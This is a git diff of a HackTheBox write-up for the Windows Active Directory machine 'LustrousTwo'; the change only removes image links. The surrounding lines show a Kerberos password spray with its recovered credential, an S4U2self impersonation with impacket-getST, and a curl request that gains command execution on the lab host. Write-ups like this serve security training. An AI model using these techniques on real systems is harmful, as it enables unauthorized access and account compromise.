@@ -3,9 +3,6 @@ title: "LustrousTwo"
 date: 2026-11-21 07:00:00 -0500
 categories: [HackTheBox, Windows]
 tags: [hackthebox, windows, hard, active-directory, kerberos, ftp, kerberoasting, s4u2self, directory-traversal, dotnet]
-image:
-    path: /assets/Images/lustroustwo-005_foothold_debug-rce.png
-    alt: LustrousTwo
 description: "LustrousTwo is a hard Windows Active Directory machine running Kerberos-only (NTLM disabled). An anonymous FTP server leaks the AD username list, a Kerberos password spray gives a foothold account, and a directory-traversal leak of the web app's DLL reveals a ShareAdmins-only PowerShell endpoint reached by abusing Kerberos S4U2self. This post covers recon through code execution as the web service account."
 ---
 
@@ -44,7 +41,6 @@ kerbrute passwordspray -d lustrous2.vl --dc lus2dc.lustrous2.vl users.txt 'Lustr
 # -> Thomas.Myers:Lustrous2024
 ```
 
-![kerberos spray](/assets/Images/lustroustwo-003_enum_signal-kerb-spray.png)
 
 With a `krb5.conf` (realm `LUSTROUS2.VL`, `kdc = <ip>`) we `kinit` and reach the site over Kerberos — using `curl --resolve` so no `/etc/hosts` edit is needed:
 
@@ -70,7 +66,6 @@ impacket-getST -self -impersonate ryan.davies -altservice HTTP/lus2dc.lustrous2.
   -k 'LUSTROUS2.VL/ShareSvc:<redacted>' -dc-ip 10.129.242.166
 ```
 
-![s4u2self impersonation](/assets/Images/lustroustwo-004_exploit_s4u2self-ryan.png)
 
 Presenting that ticket authenticates to the site as `ryan.davies` (a ShareAdmin). The Debug endpoint uses an ASP.NET antiforgery token, so we GET the form with a cookie jar, scrape the token, then POST our command + PIN:
 
@@ -83,7 +78,6 @@ curl -s -b cj --negotiate -u : --resolve lus2dc.lustrous2.vl:80:10.129.242.166 -
 # -> lustrous2\sharesvc
 ```
 
-![debug rce](/assets/Images/lustroustwo-005_foothold_debug-rce.png)
 
 We now have command execution as the web service account `lustrous2\sharesvc`.
 
